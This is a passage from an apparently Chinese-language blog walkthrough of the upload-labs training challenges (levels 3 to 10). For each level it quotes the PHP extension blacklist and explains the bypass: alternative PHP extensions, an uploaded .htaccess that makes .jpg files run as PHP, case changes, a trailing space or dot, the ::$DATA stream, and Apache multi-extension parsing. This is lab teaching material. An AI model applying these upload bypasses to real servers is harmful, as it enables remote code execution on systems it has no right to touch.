class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br></pre></td></tr></table></figure><ul><li><p>分析</p><ul><li>定义了一个文件后缀名黑名单：asp、aspx、php、jsp文件不可上传</li><li>还会对文件进行时间戳命令(随便上传一个文件后，复制文件路径即可获得文件名，可绕过)</li></ul></li><li><p>绕过</p><ul><li>利用apache解析漏洞，将后缀名改为php3</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625191451618.png" alt="image-20200625191451618"></p><h2 id="PASS-04"><a href="#PASS-04" class="headerlink" title="PASS-04"></a>PASS-04</h2></li></ul><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br></pre></td></tr></table></figure><ul><li>分析<ul><li>黑名单里的文件后缀名增多了</li></ul></li><li>绕过<ul><li>上传.hataccess文件</li></ul></li></ul><h3 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h3><ul><li>.htaccess是一个纯文本文件，它里面存放着<strong>对当前目录</strong>配置相关的指令。</li><li>主要作用：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</li><li>作用范围：<strong>当前目录</strong>。</li></ul><h4 id="httpd-conf"><a href="#httpd-conf" class="headerlink" title="httpd.conf"></a>httpd.conf</h4><p>httpd.conf是apache的全局配置文件</p><p>在httpd.conf中加入下面命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 将phtml当作php文件解析</span><br><span class="line">AddType application/x-httpd-php .php .phtml</span><br><span class="line"></span><br><span class="line"># 将所有文件都当作php文件解析</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>这两条命令对应到.htaccess中的话，可以像下面这样写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 将所有文件当作php解析</span><br><span class="line">AddType application/x-httpd-php </span><br><span class="line"></span><br><span class="line"># 将jpg文件当作php文件解析</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>了解了.htaccess文件后，我们来绕过，创建一个文本，在文本中写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php</span><br></pre></td></tr></table></figure><p>上传成功</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625200156721.png" alt="image-20200625200156721"></p><p>然后将phpinfo.php修改后缀名为：.jpg上传，成功执行</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625200245829.png" alt="image-20200625200245829"></p><h2 id="PASS-05"><a href="#PASS-05" class="headerlink" title="PASS-05"></a>PASS-05</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>分析：</p><ul><li>过滤了.htaccess，第四关的方法不能用</li><li>但是看了一下黑名单，发现没有PhP大小写的过滤</li></ul><p>绕过：上传phpinfo.PhP</p><h2 id="PASS-06"><a href="#PASS-06" class="headerlink" title="PASS -06"></a>PASS -06</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">//获取后缀名</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//将后缀名转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>分析</p><ul><li>这段代码与上一关相比，少了一个后缀名首尾去空的环节，猜测是后缀名加空绕过</li></ul><p>绕过</p><ul><li>上传phpinfo.php ，然后抓包加空格</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200625202932255.png" alt="image-20200625202932255"></p><h2 id="PASS-07"><a href="#PASS-07" class="headerlink" title="PASS-07"></a>PASS-07</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);<span class="comment">//获取后缀名</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//将::$DATA替换成空，去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>分析</p><ul><li>少了deldot函数删除文件名末尾的点</li><li>此处关注一个函数：strrchr()<ul><li>查找指定字符在字符串中的最后一次出现，即假如我上传的文件名为test.php.的时候，它获取的是空值</li></ul></li><li>在Windows中，文件系统会自动忽略末尾的<code>.</code>，但是在linux中则不行</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200626125330941.png" alt="image-20200626125330941"></p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200626125240540.png" alt="image-20200626125240540"></p><p>绕过</p><ul><li>上传文件名为test.php.</li></ul><h2 id="PASS-08"><a href="#PASS-08" class="headerlink" title="PASS-08"></a>PASS-08</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>代码删除了对<code>::$DATA</code>的过滤，了解了一下::$DATA，具体见这篇文章<a href="https://blog.csdn.net/vivilorne/article/details/3841509">https://blog.csdn.net/vivilorne/article/details/3841509</a></p><p>绕过</p><ul><li>抓包将文件名修改为phpinfo.php::$data</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200626133631771.png" alt="image-20200626133631771"></p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200626133711930.png" alt="image-20200626133711930"></p><h2 id="PASS-09"><a href="#PASS-09" class="headerlink" title="PASS - 09"></a>PASS - 09</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>绕过：</p><ul><li>利用apache的解析漏洞<ul><li>当apache在解析一个文件时，从右往左依次寻找.最后出现的位置，然后截取后面的后缀名进行对应文件解析</li><li>如此后缀名不能解析，则会依次向前寻找，直到找到可以解析的文件名后缀</li></ul></li><li>上传文件名为：phpinfo.php.xxx</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200626134200901.png" alt="image-20200626134200901"></p><h2 id="PASS-10"><a href="#PASS-10" class="headerlink" title="PASS - 10"></a>PASS - 10</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span 